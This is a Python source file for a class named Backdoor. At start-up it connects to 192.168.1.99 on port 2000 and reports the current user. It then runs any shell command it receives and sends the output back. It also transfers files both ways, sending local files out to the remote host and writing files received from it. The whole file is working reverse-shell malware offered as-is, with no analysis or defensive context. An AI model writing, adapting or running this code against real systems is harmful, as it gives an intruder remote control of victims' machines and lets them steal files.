import socket,subprocess,os

class Backdoor:

    def __init__(self, IP, PORT):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((IP,PORT))
        self.r_send(self.exec_cmd("whoami"))
        

    def exec_cmd(self, cmd):
        res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout = res.stdout.read().decode().strip()
        stderr = res.stderr.read().decode().strip()
        if stdout:
            return (stdout)
        elif stderr:
            return (stderr)
    
    def r_send(self, msg):
        try:
            msg +="done"
            msg = msg.encode()
            self.connection.send(msg)
        except TypeError:
            pass

    def r_recv(self):
        return self.connection.recv(1024).decode()
    
    def change_dir(self,dirr):
        try:
            os.chdir(dirr)
            self.r_send(self.exec_cmd("pwd"))
        except Exception as e:
            self.r_send(str(e))
        
    def upload(self,filename):
        if os.path.exists(filename):
            f = open(filename,'rb')
            packet = f.read(1024)
            while(len(packet)>0):
                self.connection.send(packet)
                packet = f.read(1024)
            self.connection.send("done".encode())
        else:
            self.connection.send("[-] File not found".encode())

    def download(self, filename):
        f = open(filename,"wb")
        while(True):
            packet = self.connection.recv(1024)
            if "[-] File not found".encode() in packet:
                f.close()
                os.remove(filename)
                break
            elif packet.endswith("done".encode()):
                f.write(packet[:-4])
                f.close()
                break
            f.write(packet)

    def run(self):
        while(True):
            cmd = self.r_recv()
            cmd = cmd.split(' ')
            if cmd[0] == "cd":
                self.change_dir(cmd[1])

            if cmd[0] == "download":
                self.upload(cmd[1])
            if cmd[0] == "upload":
                self.download(cmd[1])

            elif len(cmd)>0:
                result = self.exec_cmd(cmd)
                self.r_send(result)


backdoor = Backdoor("192.168.1.99",2000)
backdoor.run()